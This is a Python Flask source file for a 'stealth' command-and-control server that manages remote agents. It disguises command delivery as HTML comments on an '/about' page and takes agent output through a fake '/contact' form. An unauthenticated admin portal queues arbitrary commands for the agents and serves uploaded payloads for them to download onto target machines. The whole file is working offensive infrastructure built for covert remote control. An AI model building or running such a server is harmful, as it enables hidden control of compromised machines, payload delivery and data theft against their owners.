# stealth_c2/c2_server.py
# Command and Control server for managing agents via HTTP/HTTPS

from flask import Flask, request, render_template, redirect, url_for, flash, Response, jsonify, send_from_directory
from datetime import datetime, timedelta
import json
import queue
import os
import secrets

# Initialize Flask app
app = Flask(__name__)
app.secret_key = "dev-secret-key"  # for flash messages; replace in prod

# Global storage for agent management
agent_tasks = {}        # Commands queued for each agent
agent_responses = {}     # Responses received from agents
agent_last_seen = {}     # Last heartbeat timestamp for each agent
_event_subscribers = set()  # SSE subscribers for real-time updates

# File upload directory for agent payloads
UPLOAD_DIR = os.path.join(os.path.dirname(__file__), "uploads")
os.makedirs(UPLOAD_DIR, exist_ok=True)


def _publish_event(event):
    """Publish events to all SSE subscribers for real-time updates"""
    dead = []
    for q in list(_event_subscribers):
        try:
            q.put_nowait(event)
        except Exception:
            dead.append(q)
    for q in dead:
        _event_subscribers.discard(q)

@app.route("/")
def index():
    """Landing page - redirects to admin dashboard"""
    return redirect(url_for("dashboard"))

@app.route("/about")
def about():
    """Agent beacon endpoint - agents check here for commands"""
    agent_id = request.args.get("id")
    if agent_id:
        # Update last seen timestamp and publish heartbeat event
        agent_last_seen[agent_id] = datetime.utcnow()
        _publish_event({"type": "heartbeat", "agent_id": agent_id})
    
    # Check if there's a command queued for this agent
    if agent_id in agent_tasks:
        task = agent_tasks.pop(agent_id)  # Remove task after sending
        return f"<!--cmd:{task}--><p>About us page. Updated {datetime.now()}</p>"
    
    return render_template("about.html")

@app.route("/contact", methods=["POST"])
def contact():
    """Agent response endpoint - agents send command results here"""
    agent_id = request.form.get("id")
    response = request.form.get("msg")
    if agent_id and response:
        # Store agent response and update last seen
        agent_responses[agent_id] = response
        agent_last_seen[agent_id] = datetime.utcnow()
        print(f"[+] Response from {agent_id}:\n{response}")
        _publish_event({"type": "response", "agent_id": agent_id})
    return render_template("contact.html")

# -------------------- Admin Web Portal --------------------
@app.route("/admin", methods=["GET"])  # dashboard
def dashboard():
    """Admin dashboard - shows all agents and their status"""
    # Get all known agents from various data structures
    agents = sorted(set(list(agent_tasks.keys()) + list(agent_responses.keys()) + list(agent_last_seen.keys())))
    
    # Consider an agent active if seen in the last 60 seconds
    now = datetime.utcnow()
    cutoff = now - timedelta(seconds=60)
    active_agents = [
        {"id": a, "last_seen": agent_last_seen[a], "seconds_ago": int((now - agent_last_seen[a]).total_seconds())}
        for a in agent_last_seen
        if agent_last_seen[a] >= cutoff
    ]
    active_agents.sort(key=lambda x: x["seconds_ago"])  # freshest first
    
    return render_template(
        "admin/dashboard.html",
        agents=agents,
        tasks=agent_tasks,
        responses=agent_responses,
        active_agents=active_agents,
    )


# -------- File Uploads for Agents --------
@app.route("/admin/upload", methods=["POST"])
def admin_upload():
    """Upload files to be transferred to agents"""
    agent_id = request.form.get("agent_id", "").strip()
    dest_path = request.form.get("dest_path", "").strip()
    f = request.files.get("file")
    if not agent_id or not dest_path or not f or f.filename == "":
        flash("Agent, destination path, and file are required", "error")
        return redirect(url_for("dashboard"))

    # Save with a random prefix to avoid collisions
    safe_name = f.filename.replace("\\", "_").replace("/", "_")
    token = secrets.token_hex(4)
    saved_name = f"{token}_{safe_name}"
    save_path = os.path.join(UPLOAD_DIR, saved_name)
    f.save(save_path)

    # Build absolute URL for the agent to fetch
    base = request.host_url.rstrip("/")
    url = f"{base}/payloads/{saved_name}"

    # Queue PUT command for agent to download and save the file
    agent_tasks[agent_id] = f"PUT {url} {dest_path}"
    flash(f"Uploaded {safe_name} and queued transfer to {agent_id}", "success")
    _publish_event({"type": "upload", "agent_id": agent_id})
    return redirect(url_for("dashboard"))


@app.route("/admin/uploads", methods=["GET"])  # uploads page
def admin_uploads_page():
    """File upload page for transferring files to agents"""
    agents = sorted(set(list(agent_tasks.keys()) + list(agent_responses.keys()) + list(agent_last_seen.keys())))
    return render_template("admin/uploads.html", agents=agents)


@app.route("/payloads/<path:filename>")
def payloads(filename):
    """Serve uploaded files to agents for download"""
    return send_from_directory(UPLOAD_DIR, filename, as_attachment=False)


@app.route("/admin/data", methods=["GET"])  # JSON snapshot for live refresh
def admin_data():
    """JSON API endpoint for live dashboard updates"""
    now = datetime.utcnow()
    cutoff = now - timedelta(seconds=60)
    agents = sorted(set(list(agent_tasks.keys()) + list(agent_responses.keys()) + list(agent_last_seen.keys())))
    active_agents = [
        {"id": a, "last_seen": agent_last_seen[a].isoformat() + "Z", "seconds_ago": int((now - agent_last_seen[a]).total_seconds())}
        for a in agent_last_seen if agent_last_seen[a] >= cutoff
    ]
    active_agents.sort(key=lambda x: x["seconds_ago"])
    return jsonify({
        "agents": agents,
        "tasks": agent_tasks,
        "responses": agent_responses,
        "active_agents": active_agents,
    })


@app.route("/admin/stream")  # Server-Sent Events for live updates
def admin_stream():
    """Server-Sent Events endpoint for real-time dashboard updates"""
    subscriber = queue.Queue(maxsize=100)
    _event_subscribers.add(subscriber)

    def event_stream():
        # Initial ping so clients fetch immediately
        yield "data: {}\n\n"
        last_keepalive = datetime.utcnow()
        while True:
            try:
                item = subscriber.get(timeout=15)
                payload = json.dumps(item)
                yield f"data: {payload}\n\n"
                last_keepalive = datetime.utcnow()
            except Exception:
                # keep-alive comment every ~15s to keep connection open through proxies
                yield ": keep-alive\n\n"
                # loop continues

    headers = {"Cache-Control": "no-cache", "X-Accel-Buffering": "no"}
    return Response(event_stream(), headers=headers, mimetype="text/event-stream")

@app.route("/admin/send", methods=["POST"])  # form POST helper
def admin_send():
    """Send commands to agents via web form"""
    agent_id = request.form.get("agent_id", "").strip()
    command = request.form.get("cmd", "").strip()
    if not agent_id:
        flash("Agent ID is required", "error")
        return redirect(url_for("dashboard"))
    # Queue command for agent
    agent_tasks[agent_id] = command
    flash(f"Task queued for {agent_id}", "success")
    return redirect(url_for("dashboard"))

@app.route("/admin/set/<agent_id>", methods=["POST"])
def set_task(agent_id):
    """API endpoint to set tasks for agents (used by external tools)"""
    # Prefer a named form field, else fall back to raw body
    command = request.form.get("cmd")
    if command is None or command.strip() == "":
        command = request.get_data(as_text=True).strip()
        # Handle the case "keyonly=" → become empty; try to salvage RHS if present
        if "=" in command and command.endswith("="):
            command = ""  # nothing useful there

    print(f"[admin/set] agent_id={agent_id} len(command)={len(command)!r} raw_body={request.get_data(as_text=True)!r}")
    agent_tasks[agent_id] = command
    return f"Task for {agent_id} set."

@app.route("/admin/view/<agent_id>")
def view(agent_id):
    """View the last response from a specific agent"""
    return agent_responses.get(agent_id, "No response")

if __name__ == "__main__":
    """Start the C2 server with HTTPS"""
    print("[*] Stealth C2 running on https://localhost:4443")
    app.run(host="0.0.0.0", port=4443, ssl_context=("cert.pem", "key.pem"))